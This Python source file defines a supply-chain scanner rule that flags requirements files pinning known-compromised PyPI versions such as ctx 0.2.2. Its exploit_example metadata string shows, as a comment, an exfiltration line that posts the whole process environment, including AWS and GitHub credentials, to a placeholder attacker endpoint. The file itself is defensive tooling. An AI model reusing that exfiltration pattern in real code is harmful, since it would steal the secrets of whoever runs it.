"""PYPI-006, requirements file pins a known-compromised PyPI package."""
from __future__ import annotations

import re

from ...base import Finding, Location, Severity, severity_rank
from ...rule import Rule
from .._compromised_packages import lookup
from ..base import RequirementsFile, iter_specs

RULE = Rule(
    id="PYPI-006",
    title="requirements.txt pins a known-compromised PyPI package version",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-3", "CICD-SEC-8"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-829", "CWE-506"),
    recommendation=(
        "Rotate every secret reachable to any process that ran "
        "``pip install`` against this requirements file during the "
        "window the compromised version was installed (AWS keys, "
        "GH tokens, SSH keys — most published PyPI compromises "
        "have been credential stealers). Bump the affected "
        "requirement to a post-incident clean version published "
        "after the maintainer / PyPI took down the malicious "
        "release, and audit CI logs for the exfiltration shape the "
        "advisory documents. Pair with PYPI-002 (``--require-"
        "hashes``) so a future swap of the same version literal "
        "fails verification."
    ),
    docs_note=(
        "Walks every ``name==version`` line in the requirements "
        "file against the curated compromised-package registry in "
        "``pipeline_check.core.checks.pypi._compromised_packages``. "
        "Name matching follows PEP 503 normalization (lowercase, "
        "underscore/dot folded to hyphen) so ``Pillow``, ``pillow``, "
        "and ``Pil_Low`` resolve to the same registry entry. Lines "
        "without an exact ``==`` pin can't be evaluated by this "
        "rule (the version literal isn't decidable from the file "
        "alone); those are PYPI-001's surface. VCS URLs and local "
        "/ editable installs are skipped — they don't carry a "
        "registry-resolvable version. Registry is hand-curated and "
        "append-only; refresh by PR with the citing advisory."
    ),
    known_fp=(
        "The registry covers only public, advisory-confirmed "
        "compromises. Pre-disclosure compromises and yet-unpublished "
        "maintainer-account takeovers do not land until the citing "
        "advisory exists. For broader coverage, run "
        "``pip-audit`` or ``osv-scanner`` alongside pipeline-check; "
        "PYPI-006 is the curated supply-chain anchor, not a "
        "vulnerability database.",
    ),
    incident_refs=(
        "ctx package compromise (May 2022): the abandoned ``ctx`` "
        "package was claimed by an attacker and republished with an "
        "env-var exfiltration payload targeting AWS keys / GitHub "
        "tokens. https://isc.sans.edu/diary/28772",
        "requests-darwin-lite 2.27.1 "
        "([GHSA-7gjg-3qcj-9jvg](https://github.com/advisories/GHSA-7gjg-3qcj-9jvg), "
        "May 2024): typosquat-flavored package whose wheel embedded "
        "the Geneva malware framework.",
    ),
    exploit_example=(
        "# Vulnerable: requirements.txt pins a compromised version.\n"
        "ctx==0.2.2\n"
        "\n"
        "# Attack: ctx 0.2.2 carries a postinstall-equivalent at\n"
        "# wheel install time that exfiltrates the environment to\n"
        "# an attacker endpoint:\n"
        "#   import os, requests\n"
        "#   requests.post('https://<attacker>/c',\n"
        "#                 data=json.dumps(dict(os.environ)))\n"
        "# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN,\n"
        "# and every other CI-env credential go out in one POST.\n"
        "\n"
        "# Safe: do not install ctx 0.2.2-0.2.8; if you genuinely\n"
        "# need a ``ctx``-named package, vendor a fork at a known-\n"
        "# good revision into a private index and pin by hash\n"
        "# (PYPI-002)."
    ),
)


_NAME_VERSION_RE = re.compile(
    r"^\s*([A-Za-z0-9][A-Za-z0-9._\-]*)"
    r"(?:\[[^\]]*\])?"   # optional ``[extra]`` / ``[extra1,extra2]``
    r"\s*==\s*([^;\s]+)"
)


def _parse_name_version(body: str) -> tuple[str, str] | None:
    """Return ``(name, version)`` from a ``name==version`` requirement
    line, or ``None`` if the line isn't an exact pin.

    Handles PEP 508 extras (``pkg[extra]==1.0``), environment markers
    (``pkg==1.0; python_version >= '3.10'``), and surrounding
    whitespace. VCS / URL / editable lines return ``None`` because
    they don't carry a registry-resolvable ``==`` pin.
    """
    m = _NAME_VERSION_RE.match(body)
    if m is None:
        return None
    return m.group(1), m.group(2)


def check(rf: RequirementsFile) -> Finding:
    matches: list[str] = []
    locations: list[Location] = []
    advisories: set[str] = set()
    matched_severities: set[Severity] = set()
    for line in iter_specs(rf):
        parsed = _parse_name_version(line.body)
        if parsed is None:
            continue
        name, version = parsed
        hit = lookup(name, version)
        if hit is None:
            continue
        matches.append(f"{name}=={version}")
        advisories.add(hit.advisory)
        matched_severities.add(hit.severity)
        locations.append(Location(
            path=rf.path, start_line=line.line_no, end_line=line.line_no,
        ))
    passed = not matches
    if passed:
        desc = (
            "No requirement matches a known-compromised PyPI package "
            "version in the curated registry."
        )
        severity = RULE.severity
    else:
        unique = sorted(set(matches))
        ref_summary = ", ".join(unique[:3])
        if len(unique) > 3:
            ref_summary += f" (+{len(unique) - 3} more)"
        adv_summary = "; ".join(sorted(advisories))
        desc = (
            f"{len(matches)} requirement(s) match a known-compromised "
            f"PyPI package version: {ref_summary}. Rotate any secret "
            f"reachable to ``pip install`` runs against this "
            f"requirements file, then update to a post-incident clean "
            f"version. Advisory: {adv_summary}"
        )
        # Per-entry severity wins, mirroring NPM-006. Today every PyPI
        # registry entry is CRITICAL, but the next protestware-style
        # HIGH entry would otherwise misreport.
        severity = max(matched_severities, key=severity_rank)
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=severity,
        resource=rf.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
